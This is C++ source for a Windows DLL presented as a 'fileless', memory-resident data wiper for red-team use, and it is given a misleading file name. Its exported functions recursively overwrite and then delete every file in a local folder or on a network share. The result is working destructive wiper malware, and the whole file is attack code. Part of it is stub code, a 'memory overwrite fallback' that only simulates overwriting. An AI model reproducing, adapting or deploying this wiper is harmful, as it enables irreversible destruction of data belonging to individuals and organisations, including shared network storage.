// DataWiperDll.cpp/nsfw.cpp/win32.dll (Fileless Version)
// Memory-resident secure file/data wiper with local + network support (Red Team use only)

#include <windows.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <filesystem>
#include <memory>
#include <lm.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Netapi32.lib")

// --- Exported API --- //
extern "C" __declspec(dllexport) BOOL WipeData(const wchar_t* targetPath, int passes);
extern "C" __declspec(dllexport) BOOL WipeDataExtended(const wchar_t* targetPath, int passes);

// --- Core Secure Wipe --- //
bool SecureWipeFile(const std::wstring& filePath, int passes) {
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart == 0) {
        CloseHandle(hFile);
        return false;
    }

    std::unique_ptr<BYTE[]> buffer(new BYTE[(size_t)fileSize.QuadPart]);
    DWORD written = 0;

    for (int p = 0; p < passes; ++p) {
        for (LONGLONG i = 0; i < fileSize.QuadPart; ++i)
            buffer[i] = static_cast<BYTE>(rand() % 256);

        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        WriteFile(hFile, buffer.get(), (DWORD)fileSize.QuadPart, &written, NULL);
        FlushFileBuffers(hFile);
    }

    CloseHandle(hFile);
    return DeleteFileW(filePath.c_str());
}

// --- Recursive Local Wipe --- //
void WipeDirectory(const std::wstring& dirPath, int passes) {
    for (const auto& entry : std::filesystem::recursive_directory_iterator(
        dirPath, std::filesystem::directory_options::skip_permission_denied)) {
        if (entry.is_regular_file()) {
            SecureWipeFile(entry.path().wstring(), passes);
        }
    }
}

// --- Network Path Detection --- //
bool IsNetworkPath(const std::wstring& path) {
    return PathIsNetworkPathW(path.c_str());
}

// --- In-Memory Logging Stub --- //
void SimulateLogEvent(const std::wstring& filePath) {
    OutputDebugStringW((L"[WIPED] " + filePath + L"\n").c_str());
}

// --- Memory Overwrite Fallback (Non-persistent) --- //
bool TryMemoryOverwriteFallback(const std::wstring& filePath, int passes) {
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);
    std::unique_ptr<BYTE[]> dummy(new BYTE[(size_t)fileSize.QuadPart]);
    for (int i = 0; i < passes; ++i)
        for (LONGLONG j = 0; j < fileSize.QuadPart; ++j)
            dummy[j] = rand() % 256;

    return true; // Simulated overwrite
}

// --- Extended Wipe (Logs + Fallback) --- //
bool SecureWipeFileExtended(const std::wstring& filePath, int passes) {
    if (SecureWipeFile(filePath, passes)) {
        SimulateLogEvent(filePath);
        return true;
    } else {
        TryMemoryOverwriteFallback(filePath, passes);
        return false;
    }
}

// --- Recursive Wipe for Network Paths --- //
void WipeNetworkPath(const std::wstring& networkPath, int passes) {
    for (const auto& entry : std::filesystem::recursive_directory_iterator(
        networkPath, std::filesystem::directory_options::skip_permission_denied)) {
        if (entry.is_regular_file()) {
            SecureWipeFileExtended(entry.path().wstring(), passes);
        }
    }
}

// --- Exported API: Local Only --- //
extern "C" __declspec(dllexport) BOOL WipeData(const wchar_t* targetPath, int passes) {
    if (!targetPath || passes < 1) return FALSE;

    DWORD attr = GetFileAttributesW(targetPath);
    if (attr == INVALID_FILE_ATTRIBUTES) return FALSE;

    if (attr & FILE_ATTRIBUTE_DIRECTORY) {
        WipeDirectory(targetPath, passes);
    } else {
        SecureWipeFile(targetPath, passes);
    }

    return TRUE;
}

// --- Exported API: Extended --- //
extern "C" __declspec(dllexport) BOOL WipeDataExtended(const wchar_t* targetPath, int passes) {
    if (!targetPath || passes < 1) return FALSE;

    std::wstring pathStr(targetPath);
    DWORD attr = GetFileAttributesW(targetPath);
    if (attr == INVALID_FILE_ATTRIBUTES) return FALSE;

    if (IsNetworkPath(pathStr)) {
        WipeNetworkPath(pathStr, passes);
    } else if (attr & FILE_ATTRIBUTE_DIRECTORY) {
        WipeDirectory(pathStr, passes);
    } else {
        SecureWipeFileExtended(pathStr, passes);
    }

    return TRUE;
}

// --- DLL Entry Point --- //
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
